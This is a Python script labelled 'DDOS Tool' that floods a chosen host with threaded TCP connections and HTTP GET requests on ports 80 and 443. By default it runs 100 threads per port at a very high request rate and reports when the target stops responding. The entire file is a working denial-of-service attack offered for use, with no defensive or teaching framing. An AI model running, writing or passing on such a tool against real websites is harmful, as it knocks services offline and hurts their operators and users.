import socket
import threading
import time
import argparse
import sys

# Global variables for tracking packets sent
packets_sent = 0
stop_event = threading.Event()

# Function to resolve hostname to IP address
def resolve_hostname(hostname):
    try:
        ip = socket.gethostbyname(hostname)
        return ip
    except socket.gaierror as e:
        print(f"Error resolving hostname: {e}")
        sys.exit(1)

# Function to send packets
def send_packets(target_ip, target_port, packets_per_second):
    global packets_sent
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)  # Set a timeout for the connection attempt
            s.connect((target_ip, target_port))
            s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            s.close()
            packets_sent += 1
            if packets_sent % 1000 == 0:
                print(f"Sent {packets_sent} packets")
        except socket.timeout:
            print("Connection timed out")
        except socket.error as e:
            print(f"Connection error: {e}")
        time.sleep(1 / packets_per_second)

# Function to check if the website is down
def check_website_status(target_ip, target_port):
    while not stop_event.is_set():
        try:
            s = socket.create_connection((target_ip, target_port), timeout=5)
            s.close()
        except (socket.timeout, socket.error):
            print(f"Website is down on port {target_port}")
            return
        time.sleep(1)

# Function to parse command line arguments
def parse_arguments():
    parser = argparse.ArgumentParser(description='DDOS Tool')
    parser.add_argument('target', help='Target URL or IP address')
    parser.add_argument('--port', type=int, nargs='+', default=[80, 443], help='Target ports (default: 80 and 443)')
    parser.add_argument('--threads', type=int, default=100, help='Number of threads (default: 100)')
    parser.add_argument('--packets', type=int, default=10000000, help='Packets per second (default: 10,000,000)')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds to run the attack (default: 60)')
    return parser.parse_args()

def main():
    args = parse_arguments()

    # Resolve the target hostname to an IP address
    target_ip = resolve_hostname(args.target)

    # Create threads for sending packets
    threads = []
    for port in args.port:
        for _ in range(args.threads):
            thread = threading.Thread(target=send_packets, args=(target_ip, port, args.packets))
            threads.append(thread)
            thread.start()

    # Create a thread to check website status
    status_threads = []
    for port in args.port:
        thread = threading.Thread(target=check_website_status, args=(target_ip, port))
        status_threads.append(thread)
        thread.start()

    # Wait for the specified duration
    time.sleep(args.duration)

    # Set the stop event to terminate the threads
    stop_event.set()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()
    for thread in status_threads:
        thread.join()

    print(f"Attack completed. Total packets sent: {packets_sent}")

if __name__ == '__main__':
    main()